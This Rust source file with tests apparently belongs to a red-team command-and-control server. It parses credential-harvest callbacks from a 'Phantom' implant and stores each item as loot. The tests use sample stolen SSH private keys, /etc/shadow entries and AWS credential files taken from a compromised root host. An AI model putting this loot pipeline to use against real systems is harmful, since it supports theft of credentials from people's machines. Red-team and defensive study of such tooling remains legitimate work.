use std::collections::BTreeMap;

use red_cell_common::demon::DemonCommand;
use serde_json::Value;
use time::OffsetDateTime;
use time::format_description::well_known::Rfc3339;
use tracing::warn;

use crate::{AgentRegistry, Database, EventBus, LootRecord, PluginRuntime};

use super::{
    CallbackParser, CommandDispatchError, agent_response_event_with_extra, insert_loot_record,
    loot_context, loot_new_event, metadata_with_context,
};

/// Handle a `CommandHarvest` (ID 2580) callback from the Phantom agent.
///
/// The payload contains zero or more harvested credential entries in the format:
///
/// ```text
/// entry_count : u32 (LE)
/// for each entry:
///   kind  : u32-length-prefixed UTF-8 string
///   path  : u32-length-prefixed UTF-8 string
///   data  : u32-length-prefixed bytes
/// ```
///
/// Each entry is persisted as an independent loot record.  A summary
/// `agent_response_event` is broadcast after all entries are stored.
pub(super) async fn handle_harvest_callback(
    registry: &AgentRegistry,
    database: &Database,
    events: &EventBus,
    plugins: Option<&PluginRuntime>,
    agent_id: u32,
    request_id: u32,
    payload: &[u8],
) -> Result<Option<Vec<u8>>, CommandDispatchError> {
    let cmd_id = u32::from(DemonCommand::CommandHarvest);
    let mut parser = CallbackParser::new(payload, cmd_id);
    let entry_count = parser.read_u32("harvest entry_count")?;

    let context = loot_context(registry, agent_id, request_id).await;
    let captured_at = OffsetDateTime::now_utc().format(&Rfc3339)?;

    let mut stored: u32 = 0;
    for i in 0..entry_count {
        let kind = parser.read_string("harvest entry kind")?;
        let path = parser.read_string("harvest entry path")?;
        let data = parser.read_bytes("harvest entry data")?;

        if data.is_empty() {
            continue;
        }

        let name = format!("{kind}_{i}_{}", sanitize_path_for_name(&path));

        let record = insert_loot_record(
            database,
            LootRecord {
                id: None,
                agent_id,
                kind: kind.clone(),
                name: name.clone(),
                file_path: Some(path.clone()),
                size_bytes: Some(i64::try_from(data.len()).unwrap_or(i64::MAX)),
                captured_at: captured_at.clone(),
                data: Some(data),
                metadata: Some(metadata_with_context(
                    [
                        ("request_id".to_owned(), Value::String(format!("{request_id:X}"))),
                        ("source_path".to_owned(), Value::String(path.clone())),
                        ("captured_at".to_owned(), Value::String(captured_at.clone())),
                    ]
                    .into_iter(),
                    &context,
                )),
            },
        )
        .await?;

        events.broadcast(loot_new_event(&record, cmd_id, request_id, &context)?);

        if let Some(plugins) = plugins {
            if let Err(error) = plugins.emit_loot_captured(&record).await {
                warn!(
                    agent_id = format_args!("{agent_id:08X}"),
                    %error,
                    "failed to emit python loot_captured event for harvest entry"
                );
            }
        }

        stored += 1;
    }

    let (kind, message) = if stored == 0 {
        ("Info", "Credential harvest completed: no credentials found".to_owned())
    } else {
        ("Good", format!("Credential harvest completed: {stored} item(s) captured"))
    };

    events.broadcast(agent_response_event_with_extra(
        agent_id,
        cmd_id,
        request_id,
        kind,
        &message,
        BTreeMap::from([("HarvestCount".to_owned(), Value::String(stored.to_string()))]),
        String::new(),
    )?);

    Ok(None)
}

/// Convert a file path into a short, filesystem-safe label suitable for use in loot names.
fn sanitize_path_for_name(path: &str) -> String {
    path.rsplit('/').next().unwrap_or(path).replace(|c: char| !c.is_alphanumeric() && c != '.', "_")
}

#[cfg(test)]
mod tests {
    use red_cell_common::operator::OperatorMessage;
    use serde_json::Value;
    use zeroize::Zeroizing;

    use super::*;
    use crate::{AgentRegistry, Database, EventBus};

    const AGENT_ID: u32 = 0xBEEF_0001;
    const REQUEST_ID: u32 = 0x10;

    fn sample_agent() -> red_cell_common::AgentRecord {
        red_cell_common::AgentRecord {
            agent_id: AGENT_ID,
            active: true,
            reason: String::new(),
            note: String::new(),
            encryption: red_cell_common::AgentEncryptionInfo {
                aes_key: Zeroizing::new(vec![0u8; 32]),
                aes_iv: Zeroizing::new(vec![0u8; 16]),
                monotonic_ctr: false,
            },
            hostname: "linux-host".to_owned(),
            username: "root".to_owned(),
            domain_name: "WORKGROUP".to_owned(),
            external_ip: "1.2.3.4".to_owned(),
            internal_ip: "10.0.0.1".to_owned(),
            process_name: "phantom".to_owned(),
            process_path: "/tmp/phantom".to_owned(),
            base_address: 0,
            process_pid: 9001,
            process_tid: 9002,
            process_ppid: 1,
            process_arch: "x64".to_owned(),
            elevated: true,
            os_version: "Ubuntu 24.04".to_owned(),
            os_build: 0,
            os_arch: "x64".to_owned(),
            sleep_delay: 5,
            sleep_jitter: 0,
            kill_date: None,
            working_hours: None,
            first_call_in: "2026-04-01T00:00:00Z".to_owned(),
            last_call_in: "2026-04-01T00:00:00Z".to_owned(),
            archon_magic: None,
        }
    }

    async fn setup() -> (AgentRegistry, Database, EventBus) {
        let db = Database::connect_in_memory().await.expect("in-memory db");
        let registry = AgentRegistry::new(db.clone());
        let events = EventBus::new(32);
        registry.insert(sample_agent()).await.expect("insert agent");
        (registry, db, events)
    }

    fn push_u32_le(buf: &mut Vec<u8>, v: u32) {
        buf.extend_from_slice(&v.to_le_bytes());
    }

    fn push_len_string(buf: &mut Vec<u8>, s: &str) {
        push_u32_le(buf, s.len() as u32);
        buf.extend_from_slice(s.as_bytes());
    }

    fn push_len_bytes(buf: &mut Vec<u8>, data: &[u8]) {
        push_u32_le(buf, data.len() as u32);
        buf.extend_from_slice(data);
    }

    fn make_payload(entries: &[(&str, &str, &[u8])]) -> Vec<u8> {
        let mut buf = Vec::new();
        push_u32_le(&mut buf, entries.len() as u32);
        for (kind, path, data) in entries {
            push_len_string(&mut buf, kind);
            push_len_string(&mut buf, path);
            push_len_bytes(&mut buf, data);
        }
        buf
    }

    // ── Happy path: single entry stored correctly ──────────────────────────

    #[tokio::test]
    async fn single_entry_is_stored_as_loot() {
        let (registry, db, events) = setup().await;
        let mut rx = events.subscribe();

        let payload = make_payload(&[(
            "ssh_key",
            "/home/user/.ssh/id_rsa",
            b"-----BEGIN OPENSSH PRIVATE KEY-----\ndata\n-----END OPENSSH PRIVATE KEY-----",
        )]);

        handle_harvest_callback(&registry, &db, &events, None, AGENT_ID, REQUEST_ID, &payload)
            .await
            .expect("handler must succeed");

        // First event: loot-new
        let msg1 = rx.recv().await.expect("loot-new event");
        let OperatorMessage::AgentResponse(resp1) = &msg1 else {
            panic!("expected AgentResponse (loot-new)");
        };
        assert_eq!(resp1.info.extra.get("MiscType").and_then(Value::as_str), Some("loot-new"));
        assert_eq!(resp1.info.extra.get("LootKind").and_then(Value::as_str), Some("ssh_key"));

        // Second event: harvest summary
        let msg2 = rx.recv().await.expect("summary event");
        let OperatorMessage::AgentResponse(resp2) = &msg2 else {
            panic!("expected AgentResponse (summary)");
        };
        assert_eq!(resp2.info.extra.get("Type").and_then(Value::as_str), Some("Good"));

        // DB persistence
        let loot = db.loot().list_for_agent(AGENT_ID).await.expect("loot query");
        assert_eq!(loot.len(), 1);
        assert_eq!(loot[0].kind, "ssh_key");
        assert_eq!(loot[0].file_path.as_deref(), Some("/home/user/.ssh/id_rsa"));
    }

    // ── Multiple entries each produce a loot-new event ─────────────────────

    #[tokio::test]
    async fn multiple_entries_each_stored() {
        let (registry, db, events) = setup().await;
        let mut rx = events.subscribe();

        let shadow_data = b"root:$6$hash:19000:0:99999:7:::";
        let creds_data = b"[default]\naws_access_key_id=AKIA...";

        let payload = make_payload(&[
            ("shadow", "/etc/shadow", shadow_data),
            ("credentials", "/root/.aws/credentials", creds_data),
        ]);

        handle_harvest_callback(&registry, &db, &events, None, AGENT_ID, REQUEST_ID, &payload)
            .await
            .expect("handler must succeed");

        // Two loot-new events, then one summary.
        let _loot1 = rx.recv().await.expect("loot-new #1");
        let _loot2 = rx.recv().await.expect("loot-new #2");
        let summary = rx.recv().await.expect("summary");

        let OperatorMessage::AgentResponse(s) = &summary else {
            panic!("expected AgentResponse (summary)");
        };
        assert_eq!(s.info.extra.get("HarvestCount").and_then(Value::as_str), Some("2"));

        let loot = db.loot().list_for_agent(AGENT_ID).await.expect("query");
        assert_eq!(loot.len(), 2);
    }

    // ── Empty payload (zero entries) broadcasts Info event, no loot stored ─

    #[tokio::test]
    async fn zero_entries_broadcasts_info_and_stores_no_loot() {
        let (registry, db, events) = setup().await;
        let mut rx = events.subscribe();

        let payload = make_payload(&[]);

        handle_harvest_callback(&registry, &db, &events, None, AGENT_ID, REQUEST_ID, &payload)
            .await
            .expect("handler must succeed");

        let msg = rx.recv().await.expect("info event");
        let OperatorMessage::AgentResponse(resp) = &msg else {
            panic!("expected AgentResponse");
        };
        assert_eq!(resp.info.extra.get("Type").and_then(Value::as_str), Some("Info"));

        let loot = db.loot().list_for_agent(AGENT_ID).await.expect("query");
        assert!(loot.is_empty());
    }

    // ── Entries with empty data are silently skipped ────────────────────────

    #[tokio::test]
    async fn empty_data_entries_are_skipped() {
        let (registry, db, events) = setup().await;
        let mut rx = events.subscribe();

        let payload = make_payload(&[
            ("credentials", "/root/.aws/credentials", b""),
            ("shadow", "/etc/shadow", b"root:x:0:0:root:/root:/bin/bash"),
        ]);

        handle_harvest_callback(&registry, &db, &events, None, AGENT_ID, REQUEST_ID, &payload)
            .await
            .expect("handler must succeed");

        // One loot-new (shadow only, credentials skipped) + summary.
        let loot_msg = rx.recv().await.expect("loot-new event");
        let OperatorMessage::AgentResponse(l) = &loot_msg else {
            panic!("expected AgentResponse");
        };
        assert_eq!(l.info.extra.get("LootKind").and_then(Value::as_str), Some("shadow"));

        let summary = rx.recv().await.expect("summary event");
        let OperatorMessage::AgentResponse(s) = &summary else {
            panic!("expected AgentResponse");
        };
        assert_eq!(s.info.extra.get("HarvestCount").and_then(Value::as_str), Some("1"));

        let loot = db.loot().list_for_agent(AGENT_ID).await.expect("query");
        assert_eq!(loot.len(), 1);
        assert_eq!(loot[0].kind, "shadow");
    }

    // ── Truncated payload returns an error ─────────────────────────────────

    #[tokio::test]
    async fn truncated_payload_returns_error() {
        let (registry, db, events) = setup().await;

        // Less than 4 bytes — cannot read entry_count.
        let result =
            handle_harvest_callback(&registry, &db, &events, None, AGENT_ID, REQUEST_ID, &[1, 2])
                .await;
        assert!(result.is_err());
    }

    // ── sanitize_path_for_name ─────────────────────────────────────────────

    #[test]
    fn sanitize_uses_last_path_component() {
        assert_eq!(sanitize_path_for_name("/home/user/.ssh/id_rsa"), "id_rsa");
    }

    #[test]
    fn sanitize_replaces_non_alnum_chars() {
        assert_eq!(sanitize_path_for_name("file with spaces!"), "file_with_spaces_");
    }

    #[test]
    fn sanitize_keeps_dots() {
        assert_eq!(sanitize_path_for_name("/etc/shadow"), "shadow");
        assert_eq!(sanitize_path_for_name("/tmp/cookies.sqlite"), "cookies.sqlite");
    }
}
